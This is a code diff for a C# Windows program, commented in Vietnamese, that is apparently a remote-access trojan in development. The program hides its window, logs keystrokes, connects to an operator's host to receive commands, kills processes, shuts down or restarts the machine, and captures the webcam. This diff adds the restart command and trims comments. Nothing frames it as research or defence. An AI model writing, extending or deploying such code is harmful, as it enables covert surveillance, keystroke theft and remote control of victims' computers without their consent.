@@ -33,7 +33,7 @@ namespace TargetApp
         System.Windows.Forms.Timer keylogTimer = new System.Windows.Forms.Timer();
         StringBuilder keyLogBuffer = new StringBuilder();
 
-        // UI Debug (Giữ lại biến nhưng không add vào form để ẩn)
+        // UI Debug (Giữ biến nhưng không hiện)
         RichTextBox txtLog = new RichTextBox();
 
         public Form1()
@@ -41,15 +41,12 @@ namespace TargetApp
             InitializeComponent();
             CheckForIllegalCrossThreadCalls = false;
 
-            // =========================================================
-            //               CẤU HÌNH TÀNG HÌNH (QUAN TRỌNG)
-            // =========================================================
-            this.ShowInTaskbar = false;       // Không hiện icon dưới thanh Taskbar
-            this.Opacity = 0;                 // Độ mờ = 0% (Trong suốt hoàn toàn)
-            this.FormBorderStyle = FormBorderStyle.None; // Không viền
-            this.Size = new Size(1, 1);       // Kích thước siêu nhỏ
-            this.Text = "";                   // Xóa tên
-            // =========================================================
+            // --- CHẾ ĐỘ TÀNG HÌNH ---
+            this.ShowInTaskbar = false;
+            this.Opacity = 0;
+            this.FormBorderStyle = FormBorderStyle.None;
+            this.Size = new Size(1, 1);
+            this.Text = "";
 
             this.Load += Form1_Load;
             this.FormClosing += Form1_FormClosing;
@@ -57,19 +54,16 @@ namespace TargetApp
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            // Không add txtLog vào Controls nữa để form trống trơn
-
             Thread t = new Thread(ConnectLoop);
             t.IsBackground = true;
             t.Start();
 
-            // Timer Keylog
             keylogTimer.Interval = 10;
             keylogTimer.Tick += KeylogTimer_Tick;
             keylogTimer.Start();
         }
 
-        // Hàm Log bây giờ chỉ để cho có lệ, vì không ai nhìn thấy
+        // Hàm Log trống (vì ẩn giao diện)
         void Log(string msg) { }
 
         void SendPacket(string msg)
@@ -100,7 +94,7 @@ namespace TargetApp
                     client.Connect(HOST_IP, HOST_PORT);
                     stream = client.GetStream();
 
-                    SendPacket("Target Đã Ẩn Mình & Online"); // Báo về Web
+                    SendPacket("Target V8 Online (Fix Restart)");
 
                     byte[] buffer = new byte[4096];
                     while (client.Connected)
@@ -121,6 +115,7 @@ namespace TargetApp
             }
         }
 
+        // --- XỬ LÝ LỆNH ---
         void ProcessCommand(string cmd)
         {
             try
@@ -168,7 +163,16 @@ namespace TargetApp
                 {
                     StopProcess(param);
                 }
-                else if (action == "SHUTDOWN") { Process.Start("shutdown", "/s /t 0"); }
+                else if (action == "SHUTDOWN")
+                {
+                    Process.Start("shutdown", "/s /t 0");
+                }
+                // --- ĐÃ SỬA LẠI LỆNH RESTART ---
+                else if (action == "RESTART")
+                {
+                    SendPacket("Đang khởi động lại máy...");
+                    Process.Start("shutdown", "/r /t 0");
+                }
             }
             catch { }
         }
@@ -205,7 +209,7 @@ namespace TargetApp
                 }
 
                 if (count > 0) SendPacket($"OK: Đã diệt {count} tiến trình '{targetName}'");
-                else SendPacket($"LỖI: Không tắt được '{targetName}'");
+                else SendPacket($"LỖI: Không tắt được '{targetName}' (Cần quyền Admin?)");
             }
             catch (Exception ex) { SendPacket($"LỖI HỆ THỐNG: {ex.Message}"); }
         }
@@ -221,6 +225,7 @@ namespace TargetApp
 
                 videoSource = new VideoCaptureDevice(devs[0].MonikerString);
 
+                // Lấy độ phân giải tốt nhất
                 VideoCapabilities bestRes = null;
                 foreach (VideoCapabilities cap in videoSource.VideoCapabilities)
                 {
